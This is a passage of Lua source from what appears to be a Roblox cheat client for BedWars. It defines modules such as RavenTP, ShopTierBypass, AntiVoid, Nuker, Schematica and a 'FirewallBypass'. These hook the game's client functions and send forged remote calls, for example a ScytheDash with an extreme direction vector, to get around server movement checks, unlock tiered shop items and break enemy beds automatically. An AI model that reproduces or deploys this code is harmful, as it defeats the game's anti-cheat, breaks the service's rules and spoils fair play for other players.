		Name = "FOV",
		Function = function() end,
		Min = 1,
		Max = 1000,
		Default = 1000
	})
end)

runFunction(function()
	local RavenTP = {Enabled = false}
	RavenTP = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "RavenTP",
		Function = function(callback)
			if callback then
				task.spawn(function()
					if getItem("raven") then
						local plr = EntityNearMouse(1000)
						if plr then
							local projectile = bedwars.ClientHandler:Get(bedwars.SpawnRavenRemote):CallServerAsync():andThen(function(projectile)
								if projectile then
									local projectilemodel = projectile
									if not projectilemodel then
										projectilemodel:GetPropertyChangedSignal("PrimaryPart"):Wait()
									end
									local bodyforce = Instance.new("BodyForce")
									bodyforce.Force = Vector3.new(0, projectilemodel.PrimaryPart.AssemblyMass * workspace.Gravity, 0)
									bodyforce.Name = "AntiGravity"
									bodyforce.Parent = projectilemodel.PrimaryPart
	
									if plr then
										projectilemodel:SetPrimaryPartCFrame(CFrame.new(plr.RootPart.CFrame.p, plr.RootPart.CFrame.p + gameCamera.CFrame.lookVector))
										task.wait(0.3)
										bedwars.RavenTable:detonateRaven()
									else
										warningNotification("RavenTP", "Player died before it could TP.", 3)
									end
								else
									warningNotification("RavenTP", "Raven on cooldown.", 3)
								end
							end)
						else
							warningNotification("RavenTP", "Player not found.", 3)
						end
					else
						warningNotification("RavenTP", "Raven not found.", 3)
					end
				end)
				RavenTP.ToggleButton(true)
			end
		end,
		HoverText = "Spawns and teleports a raven to a player\nnear your mouse."
	})
end)

runFunction(function()
	local tiered = {}
	local nexttier = {}

	for i,v in pairs(bedwars.ShopItems) do
		if type(v) == "table" then 
			if v.tiered then
				tiered[v.itemType] = v.tiered
			end
			if v.nextTier then
				nexttier[v.itemType] = v.nextTier
			end
		end
	end

	GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "ShopTierBypass",
		Function = function(callback) 
			if callback then
				for i,v in pairs(bedwars.ShopItems) do
					if type(v) == "table" then 
						v.tiered = nil
						v.nextTier = nil
					end
				end
			else
				for i,v in pairs(bedwars.ShopItems) do
					if type(v) == "table" then 
						if tiered[v.itemType] then
							v.tiered = tiered[v.itemType]
						end
						if nexttier[v.itemType] then
							v.nextTier = nexttier[v.itemType]
						end
					end
				end
			end
		end,
		HoverText = "Allows you to access tiered items early."
	})
end)

local lagbackedaftertouch = false
runFunction(function()
	local AntiVoidPart
	local AntiVoidConnection
	local AntiVoidMode = {Value = "Normal"}
	local AntiVoidMoveMode = {Value = "Normal"}
	local AntiVoid = {Enabled = false}
	local AntiVoidTransparent = {Value = 50}
	local AntiVoidColor = {Hue = 1, Sat = 1, Value = 0.55}
	local lastvalidpos

	local function closestpos(block)
		local startpos = block.Position - (block.Size / 2) + Vector3.new(1.5, 1.5, 1.5)
		local endpos = block.Position + (block.Size / 2) - Vector3.new(1.5, 1.5, 1.5)
		local newpos = block.Position + (entityLibrary.character.HumanoidRootPart.Position - block.Position)
		return Vector3.new(math.clamp(newpos.X, startpos.X, endpos.X), endpos.Y + 3, math.clamp(newpos.Z, startpos.Z, endpos.Z))
	end

	local function getclosesttop(newmag)
		local closest, closestmag = nil, newmag * 3
		if entityLibrary.isAlive then 
			local tops = {}
			for i,v in pairs(bedwarsStore.blocks) do 
				local close = getScaffold(closestpos(v), false)
				if getPlacedBlock(close) then continue end
				if close.Y < entityLibrary.character.HumanoidRootPart.Position.Y then continue end
				if (close - entityLibrary.character.HumanoidRootPart.Position).magnitude <= newmag * 3 then 
					table.insert(tops, close)
				end
			end
			for i,v in pairs(tops) do 
				local mag = (v - entityLibrary.character.HumanoidRootPart.Position).magnitude
				if mag <= closestmag then 
					closest = v
					closestmag = mag
				end
			end
		end
		return closest
	end

	local antivoidypos = 0
	local antivoiding = false
	AntiVoid = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "AntiVoid", 
		Function = function(callback)
			if callback then
				task.spawn(function()
					AntiVoidPart = Instance.new("Part")
					AntiVoidPart.CanCollide = AntiVoidMode.Value == "Collide"
					AntiVoidPart.Size = Vector3.new(10000, 1, 10000)
					AntiVoidPart.Anchored = true
					AntiVoidPart.Material = Enum.Material.Neon
					AntiVoidPart.Color = Color3.fromHSV(AntiVoidColor.Hue, AntiVoidColor.Sat, AntiVoidColor.Value)
					AntiVoidPart.Transparency = 1 - (AntiVoidTransparent.Value / 100)
					AntiVoidPart.Position = Vector3.new(0, antivoidypos, 0)
					AntiVoidPart.Parent = workspace
					if AntiVoidMoveMode.Value == "Classic" and antivoidypos == 0 then 
						AntiVoidPart.Parent = nil
					end
					AntiVoidConnection = AntiVoidPart.Touched:Connect(function(touchedpart)
						if touchedpart.Parent == lplr.Character and entityLibrary.isAlive then
							if (not antivoiding) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and entityLibrary.character.Humanoid.Health > 0 and AntiVoidMode.Value ~= "Collide" then
								if AntiVoidMode.Value == "Velocity" then
									entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, 100, entityLibrary.character.HumanoidRootPart.Velocity.Z)
								else
									antivoiding = true
									local pos = getclosesttop(1000)
									if pos then
										local lastTeleport = lplr:GetAttribute("LastTeleported")
										RunLoops:BindToHeartbeat("AntiVoid", function(dt)
											if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) and (entityLibrary.character.HumanoidRootPart.Position - pos).Magnitude > 1 and AntiVoid.Enabled and lplr:GetAttribute("LastTeleported") == lastTeleport then 
												local hori1 = Vector3.new(entityLibrary.character.HumanoidRootPart.Position.X, 0, entityLibrary.character.HumanoidRootPart.Position.Z)
												local hori2 = Vector3.new(pos.X, 0, pos.Z)
												local newpos = (hori2 - hori1).Unit
												local realnewpos = CFrame.new(newpos == newpos and entityLibrary.character.HumanoidRootPart.CFrame.p + (newpos * ((3 + getSpeed()) * dt)) or Vector3.zero)
												entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(realnewpos.p.X, pos.Y, realnewpos.p.Z)
												antivoidvelo = newpos == newpos and newpos * 20 or Vector3.zero
												entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(antivoidvelo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, antivoidvelo.Z)
												if getPlacedBlock((entityLibrary.character.HumanoidRootPart.CFrame.p - Vector3.new(0, 1, 0)) + entityLibrary.character.HumanoidRootPart.Velocity.Unit) or getPlacedBlock(entityLibrary.character.HumanoidRootPart.CFrame.p + Vector3.new(0, 3)) then
													pos = pos + Vector3.new(0, 1, 0)
												end
											else
												RunLoops:UnbindFromHeartbeat("AntiVoid")
												antivoidvelo = nil
												antivoiding = false
											end
										end)
									else
										entityLibrary.character.HumanoidRootPart.CFrame += Vector3.new(0, 100000, 0)
										antivoiding = false
									end
								end
							end
						end
					end)
					repeat
						if entityLibrary.isAlive and AntiVoidMoveMode.Value == "Normal" then 
							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							if ray or GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled or GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then 
								AntiVoidPart.Position = entityLibrary.character.HumanoidRootPart.Position - Vector3.new(0, 21, 0)
							end
						end
						task.wait()
					until (not AntiVoid.Enabled)
				end)
			else
				if AntiVoidConnection then AntiVoidConnection:Disconnect() end
				if AntiVoidPart then
					AntiVoidPart:Destroy() 
				end
			end
		end, 
		HoverText = "Gives you a chance to get on land (Bouncing Twice, abusing, or bad luck will lead to lagbacks)"
	})
	AntiVoidMoveMode = AntiVoid.CreateDropdown({
		Name = "Position Mode",
		Function = function(val) 
			if val == "Classic" then 
				task.spawn(function()
					repeat task.wait() until bedwarsStore.matchState ~= 0 or not vapeInjected
					if vapeInjected and AntiVoidMoveMode.Value == "Classic" and antivoidypos == 0 and AntiVoid.Enabled then
						local lowestypos = 99999
						for i,v in pairs(bedwarsStore.blocks) do 
							local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							if i % 200 == 0 then 
								task.wait(0.06)
							end
							if newray and newray.Position.Y <= lowestypos then
								lowestypos = newray.Position.Y
							end
						end
						antivoidypos = lowestypos - 8
					end
					if AntiVoidPart then 
						AntiVoidPart.Position = Vector3.new(0, antivoidypos, 0)
						AntiVoidPart.Parent = workspace
					end
				end)
			end
		end,
		List = {"Normal", "Classic"}
	})
	AntiVoidMode = AntiVoid.CreateDropdown({
		Name = "Move Mode",
		Function = function(val) 
			if AntiVoidPart then 
				AntiVoidPart.CanCollide = val == "Collide"
			end
		end,
		List = {"Normal", "Collide", "Velocity"}
	})
	AntiVoidTransparent = AntiVoid.CreateSlider({
		Name = "Invisible",
		Min = 1,
		Max = 100,
		Default = 50,
		Function = function(val) 
			if AntiVoidPart then
				AntiVoidPart.Transparency = 1 - (val / 100)
			end
		end,
	})
	AntiVoidColor = AntiVoid.CreateColorSlider({
		Name = "Color",
		Function = function(h, s, v) 
			if AntiVoidPart then
				AntiVoidPart.Color = Color3.fromHSV(h, s, v)
			end
		end
	})
end)

runFunction(function()
	local oldenable2
	local olddisable2
	local oldhitblock
	local blockplacetable2 = {}
	local blockplaceenabled2 = false

	local AutoTool = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "AutoTool",
		Function = function(callback)
			if callback then
				oldenable2 = bedwars.BlockBreaker.enable
				olddisable2 = bedwars.BlockBreaker.disable
				oldhitblock = bedwars.BlockBreaker.hitBlock
				bedwars.BlockBreaker.enable = function(Self, tab)
					blockplaceenabled2 = true
					blockplacetable2 = Self
					return oldenable2(Self, tab)
				end
				bedwars.BlockBreaker.disable = function(Self)
					blockplaceenabled2 = false
					return olddisable2(Self)
				end
				bedwars.BlockBreaker.hitBlock = function(...)
					if entityLibrary.isAlive and (GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled == false or bedwarsStore.matchState ~= 0) and blockplaceenabled2 then
						local mouseinfo = blockplacetable2.clientManager:getBlockSelector():getMouseInfo(0)
						if mouseinfo and mouseinfo.target and not mouseinfo.target.blockInstance:GetAttribute("NoBreak") and not mouseinfo.target.blockInstance:GetAttribute("Team"..(lplr:GetAttribute("Team") or 0).."NoBreak") then
							if switchToAndUseTool(mouseinfo.target.blockInstance, true) then
								return
							end
						end
					end
					return oldhitblock(...)
				end
			else
				RunLoops:UnbindFromRenderStep("AutoTool")
				bedwars.BlockBreaker.enable = oldenable2
				bedwars.BlockBreaker.disable = olddisable2
				bedwars.BlockBreaker.hitBlock = oldhitblock
				oldenable2 = nil
				olddisable2 = nil
				oldhitblock = nil
			end
		end,
		HoverText = "Automatically swaps your hand to the appropriate tool."
	})
end)

runFunction(function()
	local BedProtector = {Enabled = false}
	local bedprotector1stlayer = {
		Vector3.new(0, 3, 0),
		Vector3.new(0, 3, 3),
		Vector3.new(3, 0, 0),
		Vector3.new(3, 0, 3),
		Vector3.new(-3, 0, 0),
		Vector3.new(-3, 0, 3),
		Vector3.new(0, 0, 6),
		Vector3.new(0, 0, -3)
	}
	local bedprotector2ndlayer = {
		Vector3.new(0, 6, 0),
		Vector3.new(0, 6, 3),
		Vector3.new(0, 3, 6),
		Vector3.new(0, 3, -3),
		Vector3.new(0, 0, -6),
		Vector3.new(0, 0, 9),
		Vector3.new(3, 3, 0),
		Vector3.new(3, 3, 3),
		Vector3.new(3, 0, 6),
		Vector3.new(3, 0, -3),
		Vector3.new(6, 0, 3),
		Vector3.new(6, 0, 0),
		Vector3.new(-3, 3, 3),
		Vector3.new(-3, 3, 0),
		Vector3.new(-6, 0, 3),
		Vector3.new(-6, 0, 0),
		Vector3.new(-3, 0, 6),
		Vector3.new(-3, 0, -3),
	}

	local function getItemFromList(list)
		local selecteditem
		for i3,v3 in pairs(list) do
			local item = getItem(v3)
			if item then 
				selecteditem = item
				break
			end
		end
		return selecteditem
	end

	local function placelayer(layertab, obj, selecteditems)
		for i2,v2 in pairs(layertab) do
			local selecteditem = getItemFromList(selecteditems)
			if selecteditem then
				bedwars.placeBlock(obj.Position + v2, selecteditem.itemType)
			else
				return false
			end
		end
		return true
	end

	local bedprotectorrange = {Value = 1}
	BedProtector = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "BedProtector",
		Function = function(callback)
            if callback then
                task.spawn(function()
                    for i, obj in pairs(collectionService:GetTagged("bed")) do
                        if entityLibrary.isAlive and obj:GetAttribute("Team"..(lplr:GetAttribute("Team") or 0).."NoBreak") and obj.Parent ~= nil then
                            if (entityLibrary.character.HumanoidRootPart.Position - obj.Position).magnitude <= bedprotectorrange.Value then
                                local firstlayerplaced = placelayer(bedprotector1stlayer, obj, {"obsidian", "stone_brick", "plank_oak", getWool()})
							    if firstlayerplaced then
									placelayer(bedprotector2ndlayer, obj, {getWool()})
							    end
                            end
                            break
                        end
                    end
                    BedProtector.ToggleButton(false)
                end)
            end
		end,
		HoverText = "Automatically places a bed defense (Toggle)"
	})
	bedprotectorrange = BedProtector.CreateSlider({
		Name = "Place range",
		Min = 1, 
		Max = 20, 
		Function = function(val) end, 
		Default = 20
	})
end)

runFunction(function()
	local Nuker = {Enabled = false}
	local nukerrange = {Value = 1}
	local nukereffects = {Enabled = false}
	local nukeranimation = {Enabled = false}
	local nukernofly = {Enabled = false}
	local nukerlegit = {Enabled = false}
	local nukerown = {Enabled = false}
    local nukerluckyblock = {Enabled = false}
	local nukerironore = {Enabled = false}
    local nukerbeds = {Enabled = false}
	local nukercustom = {RefreshValues = function() end, ObjectList = {}}
    local luckyblocktable = {}

	Nuker = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "Nuker",
		Function = function(callback)
            if callback then
				for i,v in pairs(bedwarsStore.blocks) do
					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
						table.insert(luckyblocktable, v)
					end
				end
				table.insert(Nuker.Connections, collectionService:GetInstanceAddedSignal("block"):Connect(function(v)
                    if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
                        table.insert(luckyblocktable, v)
                    end
                end))
                table.insert(Nuker.Connections, collectionService:GetInstanceRemovedSignal("block"):Connect(function(v)
                    if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
                        table.remove(luckyblocktable, table.find(luckyblocktable, v))
                    end
                end))
                task.spawn(function()
                    repeat
						if (not nukernofly.Enabled or not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) then
							local broke = not entityLibrary.isAlive
							local tool = (not nukerlegit.Enabled) and {Name = "wood_axe"} or bedwarsStore.localHand.tool
							if nukerbeds.Enabled then
								for i, obj in pairs(collectionService:GetTagged("bed")) do
									if broke then break end
									if obj.Parent ~= nil then
										if obj:GetAttribute("BedShieldEndTime") then 
											if obj:GetAttribute("BedShieldEndTime") > workspace:GetServerTimeNow() then continue end
										end
										if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value then
											if tool and bedwars.ItemTable[tool.Name].breakBlock and bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
												local res, amount = getBestBreakSide(obj.Position)
												local res2, amount2 = getBestBreakSide(obj.Position + Vector3.new(0, 0, 3))
												broke = true
												bedwars.breakBlock((amount < amount2 and obj.Position or obj.Position + Vector3.new(0, 0, 3)), nukereffects.Enabled, (amount < amount2 and res or res2), false, nukeranimation.Enabled)
												break
											end
										end
									end
								end
							end
							broke = broke and not entityLibrary.isAlive
							for i, obj in pairs(luckyblocktable) do
								if broke then break end
								if entityLibrary.isAlive then
									if obj and obj.Parent ~= nil then
										if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value and (nukerown.Enabled or obj:GetAttribute("PlacedByUserId") ~= lplr.UserId) then
											if tool and bedwars.ItemTable[tool.Name].breakBlock and bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
												bedwars.breakBlock(obj.Position, nukereffects.Enabled, getBestBreakSide(obj.Position), true, nukeranimation.Enabled)
												break
											end
										end
									end
								end
							end
						end
						task.wait()
                    until (not Nuker.Enabled)
                end)
            else
                luckyblocktable = {}
            end
		end,
		HoverText = "Automatically destroys beds & luckyblocks around you."
	})
	nukerrange = Nuker.CreateSlider({
		Name = "Break range",
		Min = 1, 
		Max = 30, 
		Function = function(val) end, 
		Default = 30
	})
	nukerlegit = Nuker.CreateToggle({
		Name = "Hand Check",
		Function = function() end
	})
	nukereffects = Nuker.CreateToggle({
		Name = "Show HealthBar & Effects",
		Function = function(callback) 
			if not callback then
				bedwars.BlockBreaker.healthbarMaid:DoCleaning()
			end
		 end,
		Default = true
	})
	nukeranimation = Nuker.CreateToggle({
		Name = "Break Animation",
		Function = function() end
	})
	nukerown = Nuker.CreateToggle({
		Name = "Self Break",
		Function = function() end,
	})
    nukerbeds = Nuker.CreateToggle({
		Name = "Break Beds",
		Function = function(callback) end,
		Default = true
	})
	nukernofly = Nuker.CreateToggle({
		Name = "Fly Disable",
		Function = function() end
	})
    nukerluckyblock = Nuker.CreateToggle({
		Name = "Break LuckyBlocks",
		Function = function(callback) 
			if callback then 
				luckyblocktable = {}
				for i,v in pairs(bedwarsStore.blocks) do
					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
						table.insert(luckyblocktable, v)
					end
				end
			else
				luckyblocktable = {}
			end
		 end,
		Default = true
	})
	nukerironore = Nuker.CreateToggle({
		Name = "Break IronOre",
		Function = function(callback) 
			if callback then 
				luckyblocktable = {}
				for i,v in pairs(bedwarsStore.blocks) do
					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
						table.insert(luckyblocktable, v)
					end
				end
			else
				luckyblocktable = {}
			end
		end
	})
	nukercustom = Nuker.CreateTextList({
		Name = "NukerList",
		TempText = "block (tesla_trap)",
		AddFunction = function()
			luckyblocktable = {}
			for i,v in pairs(bedwarsStore.blocks) do
				if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) then
					table.insert(luckyblocktable, v)
				end
			end
		end
	})
end)


runFunction(function()
	local controlmodule = require(lplr.PlayerScripts.PlayerModule).controls
	local oldmove
	local SafeWalk = {Enabled = false}
	local SafeWalkMode = {Value = "Optimized"}
	SafeWalk = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "SafeWalk",
		Function = function(callback)
			if callback then
				oldmove = controlmodule.moveFunction
				controlmodule.moveFunction = function(Self, vec, facecam)
					if entityLibrary.isAlive and (not Scaffold.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) then
						if SafeWalkMode.Value == "Optimized" then 
							local newpos = (entityLibrary.character.HumanoidRootPart.Position - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight * 2, 0))
							local ray = getPlacedBlock(newpos + Vector3.new(0, -6, 0) + vec)
							for i = 1, 50 do 
								if ray then break end
								ray = getPlacedBlock(newpos + Vector3.new(0, -i * 6, 0) + vec)
							end
							local ray2 = getPlacedBlock(newpos)
							if ray == nil and ray2 then
								local ray3 = getPlacedBlock(newpos + vec) or getPlacedBlock(newpos + (vec * 1.5))
								if ray3 == nil then 
									vec = Vector3.zero
								end
							end
						else
							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position + vec, Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							local ray2 = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(0, -entityLibrary.character.Humanoid.HipHeight * 2, 0), bedwarsStore.blockRaycast)
							if ray == nil and ray2 then
								local ray3 = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position + (vec * 1.8), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
								if ray3 == nil then 
									vec = Vector3.zero
								end
							end
						end
					end
					return oldmove(Self, vec, facecam)
				end
			else
				controlmodule.moveFunction = oldmove
			end
		end,
		HoverText = "lets you not walk off because you are bad"
	})
	SafeWalkMode = SafeWalk.CreateDropdown({
		Name = "Mode",
		List = {"Optimized", "Accurate"},
		Function = function() end
	})
end)

runFunction(function()
	local Schematica = {Enabled = false}
	local SchematicaBox = {Value = ""}
	local SchematicaTransparency = {Value = 30}
	local positions = {}
	local tempfolder
	local tempgui
	local aroundpos = {
		[1] = Vector3.new(0, 3, 0),
		[2] = Vector3.new(-3, 3, 0),
		[3] = Vector3.new(-3, -0, 0),
		[4] = Vector3.new(-3, -3, 0),
		[5] = Vector3.new(0, -3, 0),
		[6] = Vector3.new(3, -3, 0),
		[7] = Vector3.new(3, -0, 0),
		[8] = Vector3.new(3, 3, 0),
		[9] = Vector3.new(0, 3, -3),
		[10] = Vector3.new(-3, 3, -3),
		[11] = Vector3.new(-3, -0, -3),
		[12] = Vector3.new(-3, -3, -3),
		[13] = Vector3.new(0, -3, -3),
		[14] = Vector3.new(3, -3, -3),
		[15] = Vector3.new(3, -0, -3),
		[16] = Vector3.new(3, 3, -3),
		[17] = Vector3.new(0, 3, 3),
		[18] = Vector3.new(-3, 3, 3),
		[19] = Vector3.new(-3, -0, 3),
		[20] = Vector3.new(-3, -3, 3),
		[21] = Vector3.new(0, -3, 3),
		[22] = Vector3.new(3, -3, 3),
		[23] = Vector3.new(3, -0, 3),
		[24] = Vector3.new(3, 3, 3),
		[25] = Vector3.new(0, -0, 3),
		[26] = Vector3.new(0, -0, -3)
	}

	local function isNearBlock(pos)
		for i,v in pairs(aroundpos) do
			if getPlacedBlock(pos + v) then
				return true
			end
		end
		return false
	end

	local function gethighlightboxatpos(pos)
		if tempfolder then
			for i,v in pairs(tempfolder:GetChildren()) do
				if v.Position == pos then
					return v 
				end
			end
		end
		return nil
	end

	local function removeduplicates(tab)
		local actualpositions = {}
		for i,v in pairs(tab) do
			if table.find(actualpositions, Vector3.new(v.X, v.Y, v.Z)) == nil then
				table.insert(actualpositions, Vector3.new(v.X, v.Y, v.Z))
			else
				table.remove(tab, i)
			end
			if v.blockType == "start_block" then
				table.remove(tab, i)
			end
		end
	end

	local function rotate(tab)
		for i,v in pairs(tab) do
			local radvec, radius = entityLibrary.character.HumanoidRootPart.CFrame:ToAxisAngle()
			radius = (radius * 57.2957795)
			radius = math.round(radius / 90) * 90
			if radvec == Vector3.new(0, -1, 0) and radius == 90 then
				radius = 270
			end
			local rot = CFrame.new() * CFrame.fromAxisAngle(Vector3.new(0, 1, 0), math.rad(radius))
			local newpos = CFrame.new(0, 0, 0) * rot * CFrame.new(Vector3.new(v.X, v.Y, v.Z))
			v.X = math.round(newpos.p.X)
			v.Y = math.round(newpos.p.Y)
			v.Z = math.round(newpos.p.Z)
		end
	end

	local function getmaterials(tab)
		local materials = {}
		for i,v in pairs(tab) do
			materials[v.blockType] = (materials[v.blockType] and materials[v.blockType] + 1 or 1)
		end
		return materials
	end

	local function schemplaceblock(pos, blocktype, removefunc)
		local fail = false
		local ok = bedwars.RuntimeLib.try(function()
			bedwars.ClientHandlerDamageBlock:Get("PlaceBlock"):CallServer({
				blockType = blocktype or getWool(),
				position = bedwars.BlockController:getBlockPosition(pos)
			})
		end, function(thing)
			fail = true
		end)
		if (not fail) and bedwars.BlockController:getStore():getBlockAt(bedwars.BlockController:getBlockPosition(pos)) then
			removefunc()
		end
	end

	Schematica = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "Schematica",
		Function = function(callback)
			if callback then
				local mouseinfo = bedwars.BlockEngine:getBlockSelector():getMouseInfo(0)
				if mouseinfo and isfile(SchematicaBox.Value) then
					tempfolder = Instance.new("Folder")
					tempfolder.Parent = workspace
					local newpos = mouseinfo.placementPosition * 3
					positions = game:GetService("HttpService"):JSONDecode(readfile(SchematicaBox.Value))
					if positions.blocks == nil then
						positions = {blocks = positions}
					end
					rotate(positions.blocks)
					removeduplicates(positions.blocks)
					if positions["start_block"] == nil then
						bedwars.placeBlock(newpos)
					end
					for i2,v2 in pairs(positions.blocks) do
						local texturetxt = bedwars.ItemTable[(v2.blockType == "wool_white" and getWool() or v2.blockType)].block.greedyMesh.textures[1]
						local newerpos = (newpos + Vector3.new(v2.X, v2.Y, v2.Z))
						local block = Instance.new("Part")
						block.Position = newerpos
						block.Size = Vector3.new(3, 3, 3)
						block.CanCollide = false
						block.Transparency = (SchematicaTransparency.Value == 10 and 0 or 1)
						block.Anchored = true
						block.Parent = tempfolder
						for i3,v3 in pairs(Enum.NormalId:GetEnumItems()) do
							local texture = Instance.new("Texture")
							texture.Face = v3
							texture.Texture = texturetxt
							texture.Name = tostring(v3)
							texture.Transparency = (SchematicaTransparency.Value == 10 and 0 or (1 / SchematicaTransparency.Value))
							texture.Parent = block
						end
					end
					task.spawn(function()
						repeat
							task.wait(.1)
							if not Schematica.Enabled then break end
							for i,v in pairs(positions.blocks) do
								local newerpos = (newpos + Vector3.new(v.X, v.Y, v.Z))
								if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - newerpos).magnitude <= 30 and isNearBlock(newerpos) and bedwars.BlockController:isAllowedPlacement(lplr, getWool(), newerpos / 3, 0) then
									schemplaceblock(newerpos, (v.blockType == "wool_white" and getWool() or v.blockType), function()
										table.remove(positions.blocks, i)
										if gethighlightboxatpos(newerpos) then
											gethighlightboxatpos(newerpos):Remove()
										end
									end)
								end
							end
						until #positions.blocks == 0 or (not Schematica.Enabled)
						if Schematica.Enabled then 
							Schematica.ToggleButton(false)
							warningNotification("Schematica", "Finished Placing Blocks", 4)
						end
					end)
				end
			else
				positions = {}
				if tempfolder then
					tempfolder:Remove()
				end
			end
		end,
		HoverText = "Automatically places structure at mouse position."
	})
	SchematicaBox = Schematica.CreateTextBox({
		Name = "File",
		TempText = "File (location in workspace)",
		FocusLost = function(enter) 
			local suc, res = pcall(function() return game:GetService("HttpService"):JSONDecode(readfile(SchematicaBox.Value)) end)
			if tempgui then
				tempgui:Remove()
			end
			if suc then
				if res.blocks == nil then
					res = {blocks = res}
				end
				removeduplicates(res.blocks)
				tempgui = Instance.new("Frame")
				tempgui.Name = "SchematicListOfBlocks"
				tempgui.BackgroundTransparency = 1
				tempgui.LayoutOrder = 9999
				tempgui.Parent = SchematicaBox.Object.Parent
				local uilistlayoutschmatica = Instance.new("UIListLayout")
				uilistlayoutschmatica.Parent = tempgui
				uilistlayoutschmatica:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
					tempgui.Size = UDim2.new(0, 220, 0, uilistlayoutschmatica.AbsoluteContentSize.Y)
				end)
				for i4,v4 in pairs(getmaterials(res.blocks)) do
					local testframe = Instance.new("Frame")
					testframe.Size = UDim2.new(0, 220, 0, 40)
					testframe.BackgroundTransparency = 1
					testframe.Parent = tempgui
					local testimage = Instance.new("ImageLabel")
					testimage.Size = UDim2.new(0, 40, 0, 40)
					testimage.Position = UDim2.new(0, 3, 0, 0)
					testimage.BackgroundTransparency = 1
					testimage.Image = bedwars.getIcon({itemType = i4}, true)
					testimage.Parent = testframe
					local testtext = Instance.new("TextLabel")
					testtext.Size = UDim2.new(1, -50, 0, 40)
					testtext.Position = UDim2.new(0, 50, 0, 0)
					testtext.TextSize = 20
					testtext.Text = v4
					testtext.Font = Enum.Font.SourceSans
					testtext.TextXAlignment = Enum.TextXAlignment.Left
					testtext.TextColor3 = Color3.new(1, 1, 1)
					testtext.BackgroundTransparency = 1
					testtext.Parent = testframe
				end
			end
		end
	})
	SchematicaTransparency = Schematica.CreateSlider({
		Name = "Transparency",
		Min = 0,
		Max = 10,
		Default = 7,
		Function = function()
			if tempfolder then
				for i2,v2 in pairs(tempfolder:GetChildren()) do
					v2.Transparency = (SchematicaTransparency.Value == 10 and 0 or 1)
					for i3,v3 in pairs(v2:GetChildren()) do
						v3.Transparency = (SchematicaTransparency.Value == 10 and 0 or (1 / SchematicaTransparency.Value))
					end
				end
			end
		end
	})
end)

runFunction(function()
    local Disabler = {Enabled = false}
    Disabler = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
        Name = "FirewallBypass",
        Function = function(callback)
            if callback then 
				task.spawn(function()
					repeat
						task.wait()
						local item = getItemNear("scythe")
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then 
							bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = Vector3.new(9e9, 9e9, 9e9)})
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						end
					until (not Disabler.Enabled)
				end)
            end
        end,
		HoverText = "Float disabler with scythe"
    })
end)

runFunction(function()
	bedwarsStore.TPString = shared.vapeoverlay or nil
	local origtpstring = bedwarsStore.TPString
	local Overlay = GuiLibrary.CreateCustomWindow({
		Name = "Overlay",
		Icon = "vape/assets/TargetIcon1.png",
		IconSize = 16
	})
	local overlayframe = Instance.new("Frame")
	overlayframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
